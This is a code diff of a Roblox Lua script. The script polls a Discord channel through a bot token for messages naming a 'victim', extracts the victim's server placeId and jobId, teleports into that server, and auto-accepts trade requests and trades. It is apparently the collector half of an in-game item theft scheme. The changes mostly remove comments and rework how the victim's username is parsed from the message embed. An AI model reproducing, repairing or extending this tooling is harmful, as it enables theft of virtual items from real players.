@@ -1,5 +1,5 @@
 if not game:IsLoaded() then
-	game.Loaded:Wait() -- Wait for game to load
+    game.Loaded:Wait() -- Wait for game to load
 end
 
 if token == "" or channelId == "" then
@@ -22,7 +22,7 @@ if not victimFile then
     writefile("user.txt", "victim username")
 end
 if not joinedFile then
-    writefile("joined_ids.txt", "[]") -- Initialize with empty JSON array
+    writefile("joined_ids.txt", "[]") 
 end
 local victimUser = readfile("user.txt")
 local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
@@ -50,16 +50,16 @@ task.spawn(selectDevice)
 
 local loadingScreen = game:GetService('ReplicatedFirst'):WaitForChild('UISelector'):WaitForChild('LoadingS2'):WaitForChild('Loading')
 while loadingScreen.Enabled do
-    wait(1) -- We wait while the loading screen is active
+    wait(1)
 end
 local waittime = delay or 2
-wait(waittime) -- Small delay to account for ping and stuff
-local notused = game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest') -- Just to make sure we are fully loaded before chatting (or it will bug)
+wait(waittime)
+local notused = game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest')
 game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('/e sit2')
 
 local function saveJoinedId(messageId)
-    table.insert(joinedIds, messageId) -- Add the new ID
-    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds)) -- Save back to the file
+    table.insert(joinedIds, messageId)
+    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
 end
 
 local function acceptRequest()
@@ -106,8 +106,8 @@ local function tradeTimer()
 end
 
 waitForPlayerLeave()
-task.spawn(acceptRequest) -- Start accepting trade requests
-task.spawn(acceptTrade) -- Start accepting trades
+task.spawn(acceptRequest)
+task.spawn(acceptTrade)
 task.spawn(tradeTimer)
 
 local function autoJoin()
@@ -124,28 +124,45 @@ local function autoJoin()
     if response.StatusCode == 200 then
         local messages = HttpServ:JSONDecode(response.Body)
         if #messages == 0 then
-            print("0 messages found")
+            print("No messages found")
             return
         end
-        for _, message in ipairs(messages) do
-            if message.content ~= "" then
-                local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)') -- Extract placeId and jobId from the embed
-                if placeId and jobId then
-                    local victimUsername = message.embeds[1].fields[1].value
 
-                    if didVictimLeave or timer > 5 then
-                        if not table.find(joinedIds, tostring(message.id)) then
-                            saveJoinedId(tostring(message.id)) -- Save this ID to the list
-                            writefile("user.txt", victimUsername)
-                            game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId) -- Join the server
-                            return
+        for _, message in ipairs(messages) do
+            -- Ensure that the message has content and is an embed
+            if message.content ~= "" and message.embeds and #message.embeds > 0 then
+                local embed = message.embeds[1]
+
+                -- Extract 'placeId' and 'jobId' from the message content
+                local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%("(%d+)",%s*"([%w%-]+)"')
+                
+                -- Ensure that both placeId and jobId were found
+                if placeId and jobId then
+                    -- Extract victim username from the embed's fields (check if they exist)
+                    local victimUsername = embed.description:match("👨 Username: (.-)\n")
+
+                    if victimUsername then
+                        if didVictimLeave or timer > 5 then
+                            -- Avoid rejoining with the same messageId
+                            if not table.find(joinedIds, tostring(message.id)) then
+                                saveJoinedId(tostring(message.id)) -- Save this ID to the list
+                                writefile("user.txt", victimUsername)
+                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId) -- Join the server
+                                return
+                            end
                         end
+                    else
+                        print("Error: victimUsername not found in embed description")
                     end
+                else
+                    print("Error: placeId or jobId not found in message content")
                 end
+            else
+                print("Error: No valid embed found in message")
             end
         end
     else
-        print("Response code is not 200. Is your token and channelid correct?")
+        print("Response code is not 200. Is your token and channelId correct?")
     end
 end
 
